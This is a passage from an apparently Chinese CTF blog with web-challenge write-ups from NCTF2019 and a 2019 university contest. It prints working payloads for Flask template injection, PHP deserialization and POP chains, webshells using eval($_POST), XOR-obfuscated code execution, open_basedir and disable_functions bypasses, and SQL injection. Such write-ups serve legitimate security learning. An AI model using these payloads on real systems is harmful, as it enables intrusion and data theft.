class="hljs-meta">?&gt;</span> <span class="hljs-number">23333333</span></code></pre><pre><code class="hljs angelscript">第一层绕过: num=<span class="hljs-number">23333</span>%<span class="hljs-number">0</span>a原理:利用$无法匹配换行符号\x0a</code></pre><p>第二层绕过,限制流程是先经过is_numeric数值判断,在将讲闯入的两个参数进行md5运算,替换其中的cxhp字符为0123</p><p><img src="./1574577657048.png" srcset="/img/loading.gif" alt="1574577657048"></p><p>那这里考察的就是弱类型了</p><p>关系如下<code>==</code>在判断0e科学计数法会判断两个数值为true,但是若其中添加a-z则判定不相等</p><p><img src="./1574577621300.png" srcset="/img/loading.gif" alt="1574577621300"></p><p>所以思路就是便利数值1-999999999(任意数值)进行md5,取出两个0e开头的md5结果且其中英文字母只包含字符的<code>cxhp</code>,其余的都为数值0-9</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(s)</span>:</span><span class="hljs-keyword">return</span> hashlib.md5(s.encode(encoding=<span class="hljs-string">'UTF-8'</span>)).hexdigest()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9999999</span>):    flag = <span class="hljs-number">1</span>    j = md5(str(i))    <span class="hljs-keyword">print</span> j + <span class="hljs-string">"   "</span>+str(i)    <span class="hljs-keyword">if</span> j[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">'0e'</span>:        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> j[<span class="hljs-number">2</span>:]:            <span class="hljs-keyword">if</span> z <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">"0123456789c"</span>:           <span class="hljs-comment">#if z not in "0123456789hxp":</span>                flag = <span class="hljs-number">0</span>                <span class="hljs-keyword">break</span>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:            <span class="hljs-keyword">print</span> <span class="hljs-string">"------------------md5("</span>+str(i)+<span class="hljs-string">")="</span>+j            <span class="hljs-keyword">break</span></code></pre><p><img src="./1574581691961.png" srcset="/img/loading.gif" alt="1574581691961"></p><p>最后需要传入<code>q_w_q</code>参数,但是要求不能出现<code>_, %5f</code>,利用php特性<code>.</code>会转换为<code>_</code></p><p>要求输入的命令不能过程,使用linux正则符<code>*</code>去匹配文件</p><pre><code class="hljs ini"><span class="hljs-attr">q.w.q</span>=head%<span class="hljs-number">20</span>f*</code></pre><p><img src="./1574578727226.png" srcset="/img/loading.gif" alt="1574578727226"></p><p>最终payload</p><pre><code class="hljs angelscript">?num=<span class="hljs-number">23333</span>%<span class="hljs-number">0</span>a&amp;str1=<span class="hljs-number">2120624</span>&amp;str2=<span class="hljs-number">240610708</span>&amp;q.w.q=head%<span class="hljs-number">20f</span>*</code></pre><p><img src="./1574578708090.png" srcset="/img/loading.gif" alt="1574578708090"></p><h1 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h1><p><img src="./1574586109113.png" srcset="/img/loading.gif" alt="1574586109113"></p><p>界面侯丹代码preg_replace 存在<code>/e</code>代码执行</p><p><img src="./1574586100177.png" srcset="/img/loading.gif" alt="1574586100177"></p><p>过滤了引号</p><pre><code class="hljs php">sub=<span class="hljs-number">123</span>&amp;pat=<span class="hljs-number">123</span>&amp;rep=highlight_file(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">108</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>));</code></pre><p><img src="./1574586220392.png" srcset="/img/loading.gif" alt="1574586220392"></p><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p>访问url/字符　，会出现在界面，可能存在SSTI</p><p><img src="./1574587011327.png" srcset="/img/loading.gif" alt="1574587011327"></p><p>输入{{1+1}}</p><p><img src="./1574587056099.png" srcset="/img/loading.gif" alt="1574587056099"></p><pre><code class="hljs python">http://nctf2019.x1ct34m.com:<span class="hljs-number">40007</span>/%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>B[].__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">'/etc/passwd'</span>).read()%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D</code></pre><p>读取/etc/passwd</p><p><img src="./1574587358635.png" srcset="/img/loading.gif" alt="1574587358635"></p><pre><code class="hljs markdown">http://nctf2019.x1ct34m.com:40007/%7B%7B[<span class="hljs-string"></span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>.<span class="hljs-strong">__getitem__</span>(0).<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">'/fla'+'g'</span>).read()%7D%7D</code></pre><p><img src="./1574587380113.png" srcset="/img/loading.gif" alt="1574587380113"></p><h1 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h1><p>上传文件拿到shell地址</p><p><img src="./1574588013037.png" srcset="/img/loading.gif" alt="1574588013037"></p><p>shell文件内容　</p><p><img src="./1574588003315.png" srcset="/img/loading.gif" alt="1574588003315"></p><p>利用文件包含执行shell</p><p><img src="./1574588046019.png" srcset="/img/loading.gif" alt="1574588046019"></p><h1 id="hackbackdoor"><a href="#hackbackdoor" class="headerlink" title="hackbackdoor"></a>hackbackdoor</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> error_reporting(<span class="hljs-number">0</span>); <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'code'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'useful'</span>]))&#123;     highlight_file(<span class="hljs-keyword">__file__</span>); &#125; $code = $_GET[<span class="hljs-string">'code'</span>]; $usrful = $_GET[<span class="hljs-string">'useful'</span>]; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span><span class="hljs-params">($a)</span></span>&#123;     $dangerous = get_defined_functions();     array_push($dangerous[<span class="hljs-string">"internal"</span>], <span class="hljs-string">'eval'</span>, <span class="hljs-string">'assert'</span>);     <span class="hljs-keyword">foreach</span> ($dangerous[<span class="hljs-string">"internal"</span>] <span class="hljs-keyword">as</span> $bad) &#123;         <span class="hljs-keyword">if</span>(strpos($a,$bad) !== <span class="hljs-keyword">FALSE</span>)&#123;         <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>;         <span class="hljs-keyword">break</span>;         &#125;     &#125;     <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>; &#125; <span class="hljs-keyword">if</span>(file_exists($usrful))&#123;     <span class="hljs-keyword">if</span>(waf($code))&#123;         <span class="hljs-keyword">eval</span>($code);     &#125;     <span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">"oh,不能输入这些函数哦 :) "</span>);     &#125; &#125;</code></pre><pre><code class="hljs gcode">$&#123;<span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span>^<span class="hljs-meta">%</span>df<span class="hljs-meta">%</span>c<span class="hljs-number">7</span><span class="hljs-meta">%</span>c<span class="hljs-number">5</span><span class="hljs-meta">%</span>d<span class="hljs-number">4</span>&#125;&#123;<span class="hljs-meta">%</span>df&#125;<span class="hljs-comment">('/readflag')</span>;&amp;<span class="hljs-meta">%</span>df=highlight_file</code></pre><p><img src="./1574594549589.png" srcset="/img/loading.gif" alt="1574594549589"></p><p>proc_open执行readflag输出到/tmp/aa</p><pre><code class="hljs php">http:<span class="hljs-comment">//nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&amp;code=$b=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;q&#125;(%27/readflag%3E/tmp/aa%27,[],$z);&amp;q=proc_open</span></code></pre><p>读取flag</p><pre><code class="hljs php">http:<span class="hljs-comment">//nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&amp;code=$b=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;q&#125;(%27/tmp/aa%27);&amp;q=highlight_file</span></code></pre><p><img src="./1574594752207.png" srcset="/img/loading.gif" alt="1574594752207"></p><h1 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h1><p><img src="./1574596919240.png" srcset="/img/loading.gif" alt="1574596919240"></p><p>catchmime.php源码泄露,很明显考点是phar反序列化</p><p><img src="./1574596856480.png" srcset="/img/loading.gif" alt="1574596856480"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easytest</span></span>&#123;    <span class="hljs-keyword">protected</span> $test;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test=<span class="hljs-string">'1'</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span></span>&#123;    <span class="hljs-keyword">public</span> $url;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;url = <span class="hljs-string">'file:///etc/passwd'</span>;    &#125;&#125;$a = <span class="hljs-keyword">new</span> Easytest();<span class="hljs-keyword">echo</span> urlencode(serialize($a));$f = <span class="hljs-keyword">new</span> Main();$png_header = hex2bin(<span class="hljs-string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">'exp.phar'</span>);$phar-&gt;startBuffering();$phar-&gt;setMetadata($f);$phar-&gt;addFromString(<span class="hljs-string">'exp.txt'</span>, <span class="hljs-string">'123'</span>);$phar-&gt;setStub($png_header . <span class="hljs-string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>上传文件,读取/etc/passwd</p><pre><code class="hljs php">File is an image - image/png.The file f59a38e6c0.png has been uploaded to ./uploads/</code></pre><p><img src="./1574596884422.png" srcset="/img/loading.gif" alt="1574596884422"></p><p>内网地址<code>10.0.0.2</code></p><p><img src="./1574597037119.png" srcset="/img/loading.gif" alt="1574597037119"></p><p>内网10.0.0.3开放,并使用php-fpm处理请求</p><p><img src="./1574597300091.png" srcset="/img/loading.gif" alt="1574597300091"></p><p>利用gopher+ssrf打php-fpm(未授权漏洞)</p><p><a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher" target="_blank" rel="noopener">https://evoa.me/index.php/archives/52/#toc-SSRFGopher</a></p><p><img src="./1574597548480.png" srcset="/img/loading.gif" alt="1574597548480"></p><p>后面拿自己写的exp打也不行，拿学长打的也不行，不知道出啥问题，先鸽了．最后在绕过base_dir即可</p><h1 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h1><p><img src="./1574599975652.png" srcset="/img/loading.gif" alt="1574599975652"></p><p>存在debug界面，且任意文件读取</p><p>考点为利用PIN任意代码执行 参考链接：<a href="https://xz.aliyun.com/t/2553#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553#toc-2</a></p><p>这里有个坑点是主机的machin-id 不是直接主机获取，是docker获取</p><p><img src="./1574600199358.png" srcset="/img/loading.gif" alt="1574600199358"></p><pre><code class="hljs elixir"><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/docker/d405cfad80134749974dbff9adf048923357c30f70c44305b1bc424efd4357c8</span></code></pre><p><img src="./1574600720338.png" srcset="/img/loading.gif" alt="1574600720338"></p><p><strong>mac 地址：file:///sys/class/net/eth0/address</strong></p><p><strong>用户名：/etc/passwd</strong></p><p><img src="./1574600726752.png" srcset="/img/loading.gif" alt="1574600726752"></p><pre><code class="hljs elixir">osword<span class="hljs-variable">@papertiger</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>python PIN.py <span class="hljs-number">276-798</span><span class="hljs-number">-350</span></code></pre><p><img src="./1574600850757.png" srcset="/img/loading.gif" alt="1574600850757"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019 高校网络信息安全管理运维挑战赛web部分题解</title>
    <link href="/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周六要期末考了，抽空拿学长(大佬级别，膜一波)wp细细揣摩复现.解决完审计题ezpop,未解决只能考完试在搞了</p><h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>给了源码</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">error_reporting(<span class="hljs-number">0</span>);</span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;</span><span class="php">    <span class="hljs-keyword">protected</span> $store;</span><span class="php">    <span class="hljs-keyword">protected</span> $key;</span><span class="php">    <span class="hljs-keyword">protected</span> $expire;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($store, $key = <span class="hljs-string">'flysystem'</span>, $expire = null)</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;key    = $key;</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;store  = $store;</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;expire = $expire;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span><span class="hljs-params">(array $contents)</span></span></span><span class="php">    &#123;</span><span class="php">        $cachedProperties = array_flip([</span><span class="php">            <span class="hljs-string">'path'</span>, <span class="hljs-string">'dirname'</span>, <span class="hljs-string">'basename'</span>, <span class="hljs-string">'extension'</span>, <span class="hljs-string">'filename'</span>,</span><span class="php">            <span class="hljs-string">'size'</span>, <span class="hljs-string">'mimetype'</span>, <span class="hljs-string">'visibility'</span>, <span class="hljs-string">'timestamp'</span>, <span class="hljs-string">'type'</span>,</span><span class="php">        ]);</span><span class="php">        <span class="hljs-keyword">foreach</span> ($contents <span class="hljs-keyword">as</span> $path =&gt; $object) &#123;</span><span class="php">            <span class="hljs-keyword">if</span> (is_array($object)) &#123;</span><span class="php">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><span class="php">            &#125;</span><span class="php">        &#125;</span><span class="php">        <span class="hljs-keyword">return</span> $contents;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span><span class="hljs-params">()</span></span></span><span class="php">    &#123;</span><span class="php">        $cleaned = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);</span><span class="php">        <span class="hljs-keyword">return</span> json_encode([$cleaned, <span class="hljs-keyword">$this</span>-&gt;complete]);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span></span><span class="php">    &#123;</span><span class="php">        $contents = <span class="hljs-keyword">$this</span>-&gt;getForStorage();</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, $contents, <span class="hljs-keyword">$this</span>-&gt;expire);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">$this</span>-&gt;autosave) &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;save();</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;</span><span class="php">    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span><span class="hljs-params">($expire)</span>: <span class="hljs-title">int</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">return</span> (int) $expire;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span><span class="hljs-params">(string $name)</span>: <span class="hljs-title">string</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'prefix'</span>] . $name;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span><span class="hljs-params">($data)</span>: <span class="hljs-title">string</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">if</span> (is_numeric($data)) &#123;</span><span class="php">            <span class="hljs-keyword">return</span> (string) $data;</span><span class="php">        &#125;</span><span class="php">        $serialize = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'serialize'</span>];</span><span class="php">        <span class="hljs-keyword">return</span> $serialize($data);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span><span class="hljs-params">($name, $value, $expire = null)</span>: <span class="hljs-title">bool</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;</span><span class="php">        <span class="hljs-keyword">if</span> (is_null($expire)) &#123;</span><span class="php">            $expire = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'expire'</span>];</span><span class="php">        &#125;</span><span class="php">        $expire   = <span class="hljs-keyword">$this</span>-&gt;getExpireTime($expire);</span><span class="php">        $filename = <span class="hljs-keyword">$this</span>-&gt;getCacheKey($name);</span><span class="php">        $dir = dirname($filename);</span><span class="php">        <span class="hljs-keyword">if</span> (!is_dir($dir)) &#123;</span><span class="php">            <span class="hljs-keyword">try</span> &#123;</span><span class="php">                mkdir($dir, <span class="hljs-number">0755</span>, <span class="hljs-keyword">true</span>);</span><span class="php">            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-keyword">Exception</span> $e) &#123;</span><span class="php">                <span class="hljs-comment">// 创建失败</span></span><span class="php">            &#125;</span><span class="php">        &#125;</span><span class="php">        $data = <span class="hljs-keyword">$this</span>-&gt;serialize($value);</span><span class="php">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'data_compress'</span>] &amp;&amp; function_exists(<span class="hljs-string">'gzcompress'</span>)) &#123;</span><span class="php">            <span class="hljs-comment">//数据压缩</span></span><span class="php">            $data = gzcompress($data, <span class="hljs-number">3</span>);</span><span class="php">        &#125;</span><span class="php">        $data   = <span class="hljs-string">"&lt;?php\n//"</span> . sprintf(<span class="hljs-string">'%012d'</span>, $expire) . <span class="hljs-string">"\n exit();?&gt;\n"</span> . $data;</span><span class="php">        $result = file_put_contents($filename, $data);</span><span class="php">        <span class="hljs-keyword">if</span> ($result) &#123;</span><span class="php">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><span class="php">        &#125;</span><span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'src'</span>]))</span><span class="php">&#123;</span><span class="php">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><span class="php">&#125;</span><span class="php">$dir = <span class="hljs-string">"uploads/"</span>;</span><span class="php"><span class="hljs-keyword">if</span> (!is_dir($dir))</span><span class="php">&#123;</span><span class="php">    mkdir($dir);</span><span class="php">&#125;</span><span class="php">unserialize($_GET[<span class="hljs-string">"data"</span>]);</span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">protected</span> $store;    <span class="hljs-keyword">protected</span> $key;    <span class="hljs-keyword">protected</span> $expire;    <span class="hljs-keyword">public</span> $complete;    <span class="hljs-keyword">public</span> $cache;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;key    = <span class="hljs-string">".php"</span>;        <span class="hljs-keyword">$this</span>-&gt;store  = (<span class="hljs-keyword">new</span> B());        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-number">6666</span>;        <span class="hljs-keyword">$this</span>-&gt;complete=<span class="hljs-string">"IDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+"</span>;        <span class="hljs-keyword">$this</span>-&gt;cache=[<span class="hljs-string">"1"</span>];    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $options;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'prefix'</span>]=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource=./uploads/osword1'</span>;        <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'serialize'</span>]=<span class="hljs-string">'serialize'</span>;        <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'data_compress'</span>]=<span class="hljs-number">0</span>;    &#125;&#125;<span class="hljs-keyword">echo</span> base64_encode(serialize((<span class="hljs-keyword">new</span> a())));</code></pre><p><img src="./1574341160265.png" srcset="/img/loading.gif" alt="1574341160265"></p><h2 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h2><p>队友拿我脚本本地不成功，按他的方法记录下</p><p>serialize传入trim输出原始字符</p><p>再用个如下脚本，去掉base64无法解码字符,在满足四个字节每组就可以了</p><pre><code class="hljs pgp">&lt;?php$_GET[&#39;txt&#39;] &#x3D; preg_replace(&#39;|[^a-z0-9A-Z+&#x2F;]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);base64_decode($_GET[&#39;txt&#39;]);</code></pre><h1 id="easybypass"><a href="#easybypass" class="headerlink" title="easybypass"></a>easybypass</h1><p><img src="./1574335729862.png" srcset="/img/loading.gif" alt="1574335729862"></p><p>传phpinfo 查看禁用的函数和open_dir设置</p><p><img src="./1574335770991.png" srcset="/img/loading.gif" alt="1574335770991"></p><p><img src="./1574335780624.png" srcset="/img/loading.gif" alt="1574335780624"></p><p>绕过open_dir,查看</p><p><a href="https://zhzhdoai.github.io/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">https://zhzhdoai.github.io/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</a></p><p>glob://协议查看</p><pre><code class="hljs php">http:<span class="hljs-comment">//111.186.57.43:10101/?cmd=if%20(%20$b%20=%20opendir(%22glob:///*%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;</span></code></pre><p><img src="./1574336091182.png" srcset="/img/loading.gif" alt="1574336091182"></p><p>学长的另一个payload，直接贴出来</p><pre><code class="hljs php">mkdir(<span class="hljs-string">'/tmp/fuck'</span>);chdir(<span class="hljs-string">'/tmp/fuck/'</span>);ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);var_dump(scandir(<span class="hljs-string">'/'</span>));</code></pre><pre><code class="hljs asciidoc"><span class="hljs-link">http://111.186.57.43:10101/?cmd=file_put_contents(%27/tmp/osword.php%27,%27%3C?php%20eval($_POST</span>[<span class="hljs-string">_</span>]);?%3E%27);</code></pre><p>现在是需要bypass disable_functions去执行/readflag</p><p>蚁剑连接</p><pre><code class="hljs php">http:<span class="hljs-comment">//111.186.57.43:10101/?cmd=eval($_POST[a]);</span></code></pre><p><img src="./1574338058533.png" srcset="/img/loading.gif" alt="1574338058533"></p><p>上传该文件到/tmp目录</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><p><img src="./1574338381305.png" srcset="/img/loading.gif" alt="1574338381305"></p><pre><code class="hljs php">http:<span class="hljs-comment">//111.186.57.43:10101/?cmd=include(%27/tmp/rdd.php%27);&amp;rdd=/readflag</span></code></pre><p><img src="./1574338352562.png" srcset="/img/loading.gif" alt="1574338352562"></p><h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p><img src="./1574338584875.png" srcset="/img/loading.gif" alt="1574338584875"></p><p>源码泄露</p><p><code>login.php.swp</code></p><p><img src="./1574338562454.png" srcset="/img/loading.gif" alt="1574338562454"></p><p>传入不存在username,不传password即可绕过</p><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-number">123123123</span></code></pre><p><img src="./1574338721247.png" srcset="/img/loading.gif" alt="1574338721247"></p><p>设置cookie,返回<strong>upload.php</strong></p><p><img src="./1574339010599.png" srcset="/img/loading.gif" alt="1574339010599"></p><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">111.186</span>.<span class="hljs-number">57.123</span>:<span class="hljs-number">10501</span>/uploads/fosword.phtml?osword=<span class="hljs-keyword">system</span>(%27/readflag%27);</code></pre><p><img src="./1574339335399.png" srcset="/img/loading.gif" alt="1574339335399"></p><h1 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">"config.php"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'src'</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span><span class="hljs-params">($arr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">global</span> $mysqli;    $newarr = <span class="hljs-keyword">array</span>();    <span class="hljs-keyword">foreach</span>($arr <span class="hljs-keyword">as</span> $key=&gt;$val)    &#123;        <span class="hljs-keyword">if</span> (!is_array($val))        &#123;            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);        &#125;    &#125;    <span class="hljs-keyword">return</span> $newarr;&#125;$_GET= escape($_GET);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]))&#123;    $name = $_GET[<span class="hljs-string">'name'</span>];    mysqli_query($mysqli, <span class="hljs-string">"select age from user where name='$name'"</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'age'</span>]))&#123;    $age = $_GET[<span class="hljs-string">'age'</span>];    mysqli_query($mysqli, <span class="hljs-string">"select name from user where age=$age"</span>);&#125;</code></pre><p>HTTP请求走私绕过waf</p><p>很坑age=1+and+sleep(5)无法成功</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?age=0+or+1=1+and+sleep(5)</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 111.186.57.43:10601<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: 